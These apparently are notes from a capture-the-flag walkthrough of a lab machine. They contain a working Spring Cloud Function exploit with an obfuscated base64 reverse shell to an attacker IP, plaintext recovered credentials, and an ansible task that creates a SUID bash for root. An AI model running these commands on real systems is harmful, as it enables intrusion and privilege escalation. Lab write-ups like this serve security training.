# nmap 
```shell
nmap -sC -sV -oN scan.txt -Pn $IP -T5 -p- --min-rate=1000
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-11 05:03 CST
Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 4.84% done; ETC: 05:04 (0:01:19 remaining)
Warning: 10.129.228.213 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.228.213
Host is up (0.041s latency).
Not shown: 61662 closed tcp ports (reset), 3871 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 (RSA)
|   256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f (ECDSA)
|_  256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d (ED25519)
8080/tcp open  nagios-nsca Nagios NSCA
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.81 seconds

```


# The site has an LFI vulnerability on the /upload directory, once the user uploads a file, it creates a link where the vulnerability is found 

# Found ../../../pom.xml, it uses a vulnerable spring module 

https://sysdig.com/blog/cve-2022-22963-spring-cloud/

# Gained a shell after invoking a request that executes a code
```shell
curl -X POST http://10.129.228.213:8080/functionRouter  -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44NC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}")' --data-binary "data"
```


# /home/frank/.m2 contains credentials
phil:DocPhillovestoInject123

# Used pspy64 to get all running processes on the machine
https://github.com/DominicBreuker/pspy

# Found a process that uses ansible-parallel, it uses a config file from /opt/automation/tasks/*.yml


```shell
- hosts: localhost
  tasks:
  - name: Checking webapp service
	shell: cp /bin/bash /tmp/bash; chmod 4755 /tmp/bash
```